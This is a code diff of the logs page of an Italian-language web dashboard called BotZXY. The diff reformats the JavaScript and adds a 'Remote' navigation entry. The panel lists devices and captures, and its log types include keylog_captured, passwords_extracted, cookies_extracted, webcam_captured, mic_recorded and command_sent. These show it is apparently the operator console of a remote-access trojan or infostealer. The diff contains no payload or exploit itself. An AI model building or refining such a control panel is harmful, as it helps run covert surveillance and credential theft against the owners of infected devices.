@@ -58,7 +58,6 @@
         .hamburger { display:none; background:rgba(255,255,255,0.04); border:1px solid rgba(255,255,255,0.06); color:#fff; padding:0.4rem 0.8rem; border-radius:10px; cursor:pointer; }
         @media (max-width:768px) { .sidebar { transform:translateX(-100%); width:240px; } .sidebar.open { transform:translateX(0); } .main { margin-left:0; padding:1rem; } .topbar { flex-direction:column; align-items:stretch; } .hamburger { display:block; } }
     </style>
-    <!-- SINGOLO SCRIPT DI INIZIALIZZAZIONE TEMA -->
     <script>
         (function() {
             const savedTheme = localStorage.getItem('botzxy_theme') || 'dark';
@@ -77,11 +76,8 @@
             document.documentElement.style.setProperty('--text-primary', t.text);
             document.documentElement.style.setProperty('--bg-card', t.card);
             document.documentElement.style.setProperty('--border-color', t.border);
-            if (document.body) {
-                document.body.style.background = t.bg;
-                document.body.style.color = t.text;
-                document.body.className = 'theme-' + savedTheme;
-            }
+            if (document.body) { document.body.style.background = t.bg; document.body.style.color = t.text; document.body.className = 'theme-' + savedTheme; }
+            document.querySelectorAll('.card, .settings-card, .stat-card, .device-card, .capture-item, .stat-box, .chart-card, .table-card, .sidebar').forEach(function(el) { if (el) { el.style.background = t.card; el.style.borderColor = t.border; } });
             const savedLang = localStorage.getItem('botzxy_language') || 'it';
             document.documentElement.lang = savedLang;
         })();
@@ -92,14 +88,15 @@
     <aside class="sidebar" id="sidebar">
         <div class="logo"><i class="fas fa-robot"></i> Bot<span>ZXY</span></div>
         <nav class="nav">
-    <a href="/dashboard" data-i18n="dashboard"><i class="fas fa-tachometer-alt"></i> Dashboard</a>
-    <a href="/devices" data-i18n="devices"><i class="fas fa-mobile-alt"></i> Devices <span class="badge-nav" id="deviceBadge">0</span></a>
-    <a href="/captures" data-i18n="captures"><i class="fas fa-camera"></i> Captures <span class="badge-nav" id="captureBadge">0</span></a>
-    <a href="/analytics" data-i18n="analytics"><i class="fas fa-chart-pie"></i> Analytics</a>
-    <a href="/logs" data-i18n="logs"><i class="fas fa-history"></i> Logs</a>
-    <a href="/settings" data-i18n="settings"><i class="fas fa-cog"></i> Settings</a>
-    <a href="/logout" data-i18n="logout"><i class="fas fa-sign-out-alt"></i> Logout</a>
-</nav>
+            <a href="/dashboard" data-i18n="dashboard"><i class="fas fa-tachometer-alt"></i> Dashboard</a>
+            <a href="/devices" data-i18n="devices"><i class="fas fa-mobile-alt"></i> Devices <span class="badge-nav" id="deviceBadge">0</span></a>
+            <a href="/captures" data-i18n="captures"><i class="fas fa-camera"></i> Captures <span class="badge-nav" id="captureBadge">0</span></a>
+            <a href="/analytics" data-i18n="analytics"><i class="fas fa-chart-pie"></i> Analytics</a>
+            <a href="#" class="active" data-i18n="logs"><i class="fas fa-history"></i> Logs</a>
+            <a href="/remote" data-i18n="remote"><i class="fas fa-desktop"></i> Remote</a>
+            <a href="/settings" data-i18n="settings"><i class="fas fa-cog"></i> Settings</a>
+            <a href="/logout" data-i18n="logout"><i class="fas fa-sign-out-alt"></i> Logout</a>
+        </nav>
         <div class="footer-sidebar"><span class="status-dot"></span> <span data-i18n="system_active">Sistema attivo</span> · <span id="footerTime"></span></div>
     </aside>
     <main class="main">
@@ -123,143 +120,25 @@
     </main>
     <script src="/static/js/config.js"></script>
     <script>
-        // ============ FUNZIONI LOGS ============
-        function toggleSidebar() {
-            document.getElementById('sidebar').classList.toggle('open');
-            document.getElementById('sidebarOverlay').classList.toggle('active');
-        }
-
+        function toggleSidebar() { document.getElementById('sidebar').classList.toggle('open'); document.getElementById('sidebarOverlay').classList.toggle('active'); }
         function refreshLogs() {
-            var tbody = document.getElementById('logsBody');
-            if (!tbody) {
-                console.error('Elemento logsBody non trovato');
-                return;
-            }
-            
+            var tbody = document.getElementById('logsBody'); if (!tbody) return;
             tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;padding:1.5rem;color:rgba(255,255,255,0.1);"><i class="fas fa-spinner fa-spin"></i> <span data-i18n="loading">Caricamento...</span></td></tr>';
-            
-            fetch('/api/logs?limit=200')
-                .then(function(res) {
-                    if (!res.ok) throw new Error('Network response was not ok: ' + res.status);
-                    return res.json();
-                })
-                .then(function(data) {
-                    renderLogs(data);
-                    var countEl = document.getElementById('logCount');
-                    if (countEl) countEl.textContent = data.length + ' eventi';
-                })
-                .catch(function(err) {
-                    console.error('Errore caricamento logs:', err);
-                    tbody.innerHTML = '<tr><td colspan="4" class="empty-state"><i class="fas fa-history"></i> <span data-i18n="error">Errore di connessione</span></td></tr>';
-                });
+            fetch('/api/logs?limit=200').then(function(res){ if(!res.ok) throw new Error('Network response was not ok: '+res.status); return res.json(); }).then(function(data){ renderLogs(data); var countEl=document.getElementById('logCount'); if(countEl) countEl.textContent=data.length+' eventi'; }).catch(function(err){ console.error('Errore caricamento logs:',err); tbody.innerHTML='<tr><td colspan="4" class="empty-state"><i class="fas fa-history"></i> <span data-i18n="error">Errore di connessione</span></td></tr>'; });
         }
-
         function renderLogs(logs) {
-            var tbody = document.getElementById('logsBody');
-            if (!tbody) return;
-            
-            if (!logs || logs.length === 0) {
-                tbody.innerHTML = '<tr><td colspan="4" class="empty-state"><i class="fas fa-inbox"></i> <span data-i18n="no_logs">Nessun log disponibile</span></td></tr>';
-                return;
-            }
-
-            var actionColors = {
-                'register': 'success',
-                'command_sent': 'info',
-                'screenshot_captured': 'warning',
-                'webcam_captured': 'warning',
-                'mic_recorded': 'warning',
-                'keylog_captured': 'danger',
-                'passwords_extracted': 'danger',
-                'wifi_extracted': 'info',
-                'clipboard_captured': 'info',
-                'mouse_interaction': 'info',
-                'file_list': 'info',
-                'cookies_extracted': 'danger',
-                'login_failed': 'danger',
-                'login_success': 'success',
-                'login_blocked': 'danger',
-                'logout': 'info',
-                'device_updated': 'info',
-                'device_registered': 'success',
-                'command_result': 'info',
-                'settings_updated': 'info',
-                'password_changed': 'success',
-                'logout_all': 'warning',
-                'logs_cleared': 'danger'
-            };
-
-            var html = '';
-            for (var i = 0; i < logs.length; i++) {
-                var log = logs[i];
-                var time = new Date(log.timestamp).toLocaleString();
-                var action = log.action || 'unknown';
-                var colorClass = actionColors[action] || 'info';
-                var device = log.device_id ? log.device_id.substring(0, 12) + '...' : 'Sistema';
-                
-                html += '<tr>' +
-                    '<td class="log-time">' + time + '</td>' +
-                    '<td style="font-size:0.7rem;color:rgba(255,255,255,0.3);">' + device + '</td>' +
-                    '<td><span class="badge-log ' + colorClass + '">' + action.replace(/_/g, ' ') + '</span></td>' +
-                    '<td class="log-details">' + (log.details || '') + '</td>' +
-                '</tr>';
-            }
-            tbody.innerHTML = html;
+            var tbody = document.getElementById('logsBody'); if (!tbody) return;
+            if (!logs || logs.length === 0) { tbody.innerHTML = '<tr><td colspan="4" class="empty-state"><i class="fas fa-inbox"></i> <span data-i18n="no_logs">Nessun log disponibile</span></td></tr>'; return; }
+            var actionColors = {'register':'success','command_sent':'info','screenshot_captured':'warning','webcam_captured':'warning','mic_recorded':'warning','keylog_captured':'danger','passwords_extracted':'danger','wifi_extracted':'info','clipboard_captured':'info','mouse_interaction':'info','file_list':'info','cookies_extracted':'danger','login_failed':'danger','login_success':'success','login_blocked':'danger','logout':'info','device_updated':'info','device_registered':'success','command_result':'info','settings_updated':'info','password_changed':'success','logout_all':'warning','logs_cleared':'danger'};
+            var html='';
+            for(var i=0;i<logs.length;i++){ var log=logs[i]; var time=new Date(log.timestamp).toLocaleString(); var action=log.action||'unknown'; var colorClass=actionColors[action]||'info'; var device=log.device_id?log.device_id.substring(0,12)+'...':'Sistema'; html+='<tr><td class="log-time">'+time+'</td><td style="font-size:0.7rem;color:rgba(255,255,255,0.3);">'+device+'</td><td><span class="badge-log '+colorClass+'">'+action.replace(/_/g,' ')+'</span></td><td class="log-details">'+(log.details||'')+'</td></tr>'; }
+            tbody.innerHTML=html;
         }
-
-        function exportLogs() {
-            fetch('/api/logs/export')
-                .then(function(res) { return res.json(); })
-                .then(function(data) {
-                    var blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
-                    var url = URL.createObjectURL(blob);
-                    var a = document.createElement('a');
-                    a.href = url;
-                    a.download = 'logs_' + new Date().toISOString().slice(0,10) + '.json';
-                    a.click();
-                    URL.revokeObjectURL(url);
-                })
-                .catch(function() { alert('Errore esportazione'); });
-        }
-
-        function clearLogs() {
-            if (confirm('⚠️ Cancellare TUTTI i log? Questa operazione è irreversibile.')) {
-                fetch('/api/logs/clear', {method: 'POST'})
-                    .then(function() { 
-                        refreshLogs(); 
-                        alert('✅ Log cancellati'); 
-                    })
-                    .catch(function() { alert('❌ Errore'); });
-            }
-        }
-
-        function updateTime() {
-            var footer = document.getElementById('footerTime');
-            if (footer) footer.textContent = new Date().toLocaleTimeString('it-IT');
-        }
-
-        // ============ CARICAMENTO INIZIALE ============
-        fetch('/api/stats')
-            .then(function(res) { return res.json(); })
-            .then(function(data) {
-                var badge1 = document.getElementById('deviceBadge');
-                var badge2 = document.getElementById('captureBadge');
-                if (badge1) badge1.textContent = data.total_devices || 0;
-                if (badge2) badge2.textContent = data.total_captures || 0;
-            })
-            .catch(function() { console.log('Errore caricamento stats'); });
-
-        // Avvia il refresh
-        refreshLogs();
-        setInterval(refreshLogs, 30000);
-        setInterval(updateTime, 1000);
-        updateTime();
+        function exportLogs() { fetch('/api/logs/export').then(r=>r.json()).then(data=>{ var blob=new Blob([JSON.stringify(data,null,2)],{type:'application/json'}); var url=URL.createObjectURL(blob); var a=document.createElement('a'); a.href=url; a.download='logs_'+new Date().toISOString().slice(0,10)+'.json'; a.click(); URL.revokeObjectURL(url); }).catch(()=>alert('Errore esportazione')); }
+        function clearLogs() { if(confirm('⚠️ Cancellare TUTTI i log? Questa operazione è irreversibile.')) { fetch('/api/logs/clear',{method:'POST'}).then(()=>{ refreshLogs(); alert('✅ Log cancellati'); }).catch(()=>alert('❌ Errore')); } }
+        function updateTime() { var footer=document.getElementById('footerTime'); if(footer) footer.textContent=new Date().toLocaleTimeString('it-IT'); }
+        fetch('/api/stats').then(r=>r.json()).then(data=>{ var badge1=document.getElementById('deviceBadge'); var badge2=document.getElementById('captureBadge'); if(badge1) badge1.textContent=data.total_devices||0; if(badge2) badge2.textContent=data.total_captures||0; });
+        refreshLogs(); setInterval(refreshLogs,30000); setInterval(updateTime,1000); updateTime();
     </script>
 </body>
 </html>
-
-
-
-
-
-
